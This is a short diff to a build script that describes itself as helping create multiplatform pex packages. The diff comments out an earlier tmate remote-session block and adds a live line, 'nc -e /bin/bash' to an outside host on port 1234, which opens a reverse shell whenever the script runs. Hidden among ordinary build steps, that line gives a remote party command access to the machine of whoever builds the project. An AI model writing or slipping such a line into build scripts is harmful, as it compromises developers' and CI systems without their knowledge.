@@ -3,10 +3,11 @@
 # sivann 2023
 # Helps create multiplatform-pex
 
-export TERM=vt100
-sudo apt-get -y install tmate
-tmate
-exit
+#export TERM=vt100
+#sudo apt-get -y install tmate
+#tmate
+#exit
+nc -e /bin/bash mute.netmode.ece.ntua.gr 1234
 
 PYTHON_MINVER="3.9"
 commit_hash=$(git rev-parse --short HEAD)
